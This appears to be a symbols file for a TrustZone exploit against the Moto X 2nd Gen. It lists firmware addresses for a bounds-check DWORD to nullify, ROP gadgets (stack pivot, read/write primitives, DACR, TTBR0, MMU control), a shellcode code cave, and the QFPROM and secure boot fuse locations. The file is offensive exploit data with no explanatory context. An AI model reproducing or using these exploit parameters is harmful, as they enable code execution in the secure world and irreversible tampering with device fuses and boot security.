#Symbols for the Moto X 2nd Gen
#Fingerprint: motorola/victara_att/victara:4.4.4/KXE21.187-38/38:user

#The DWORD that needs to be nullified in order to pass all bounds checks
BOUNDS_CHECK_DWORD_ADDRESS = 0xFE8236A4

#The address of the DWORD which is returned when querying fver_get_version with version code 0
VERSION_CODE_0_DWORD_ADDRESS = 0xFE823D64
BOUNDS_CHECKS_RANGE_START = 0xFE82CA10
BOUNDS_CHECKS_RANGE_END = 0xFE82CC0C

#The address of the tzbsp_get_diag function pointer
TZBSP_GET_DIAG_POINTER_ADDRESS = 0xFE8299B8

#The address of the tzbsp_security_allows_memdump pointer
TZBSP_SECURITY_ALLOWS_MEMDUMP_POINTER_ADDRESS = 0xFE829A38

#The address of the pivot used
MOV_SP_R0_LDMFD_R4_R12_PC = 0xFE847C34

#The address of the BX LR gadget
BX_LR = 0xFE8097AC+1

#The address of the "LDR R0, [R0,R1]; BX LR" gadget
LDR_R0_R0_R1_BX_LR = 0xFE80CE86+1

#The address of the "STR R0, [R1]; BX LR" gadget
STR_R0_R1_BX_LR = 0xFE809E66+1

#The address of the "LDR R1, [R1]; STR R1, [R0]; BX LR" gadget
LDR_R1_R1_STR_R1_R0_BX_LR = 0xFE808D5A+1

#The address of the gadget used to set the DACR
SET_DACR = 0xFE80FCE8
#SET_DACR = 0xFE815608

#The address of the address cache invalidation gadget
INVALIDATE_INSTRUCTION_CACHE = 0xFE80F858

#The address of the code cave in which the stub shellcode is written
CODE_CAVE_ADDRESS = 0xFE818A40

#The size of the code cave
CODE_CAVE_SIZE = 0x1000 - (CODE_CAVE_ADDRESS & 0xFFF)

#The address of the getTTBR0 gadget
GET_TTBR0 = 0xFE817BA8

#The address of the setTTBR0 gadget
SET_TTBR0 = 0xFE817BB0

#The address of the tzbsp_set_l1_dump_buf pointer
TZBSP_SET_L1_DUMP_BUF_POINTER_ADDRESS = 0xFE8292F4

#The address of the enable MMU gadget
ENABLE_MMU = 0xFE80D9F4

#The address of the disable MMU gadget
DISABLE_MMU = 0xFE80DA14

#The address of the memcpy function in TZ
TZ_MEMCPY = 0xFE8150A4

#The address of the flag indicating whether QFPROM functions are enabled
QFPROM_ENABLE_FLAG = 0xFE823D5C

#The address of the allowed fuse list
QFPROM_ALLOWED_FUSE_RANGE_START = 0xFE82401C

#The length of the allowed fuse ranges list
QFPROM_ALLOWED_FUSE_LIST_LENGTH = 0x22

#The address of the "secure boot" fuse governing the bootloader lock
SECURE_BOOT_FUSE = 0xfC4B86E8

#endif
